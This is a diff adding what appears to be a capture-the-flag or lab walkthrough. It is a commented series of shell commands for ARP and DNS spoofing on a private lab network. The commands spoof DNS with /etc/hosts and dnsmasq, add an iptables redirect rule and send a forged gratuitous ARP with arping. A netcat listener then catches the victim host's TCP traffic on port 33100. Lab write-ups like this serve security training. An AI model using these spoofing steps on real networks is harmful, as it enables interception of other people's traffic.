@@ -1,0 +1,23 @@
+# Obviously, the first thing you need to do is pretend that mothership.dirty.lan resolves to your own IP.
+sudo nano /etc/hosts
+# Once inside, you have to add the entry 10.6.66.64 <-> mothership.dirty.lan (remember you need a tab in between).
+dnsmasq --no-daemon --log-entries
+# Re-run dnsmasq, try as sudo maybe, but not needed. This needs to be after you have already spoofed that mothership.dirty.lan
+# resolves to you
+
+# At this point you might want to run wireshark.
+
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -d 10.6.66.1 -j REDIRECT
+# Don't be misguided. Even though the DNS packet is UDP, this needs to be TCP because the packet sent is to port 
+# 33100 via TCP
+sudo -i  
+arping -c 1 -U -S 10.6.66.1 10.6.66.67
+# Send a message to 10.6.66.67 pretending to be 10.6.66.1. This is basically a message saying "what mac address has the IP I want"
+# and since we are pretending to be the DNS sever itself using dnsmasq, this is basically saying, I am the DNS sever and you need
+# to send messages to me!!
+
+# Now, you will need to check wireshark traffic. You can filter with the ip.dst command and see messages where 10.6.66.67 sends messages
+# to 10.6.66.64 (you). At this point, you can find the port (which is 33100) and protocol, which is TCP 
+
+# So now finally, run:
+sudo nc -lvnp 33100
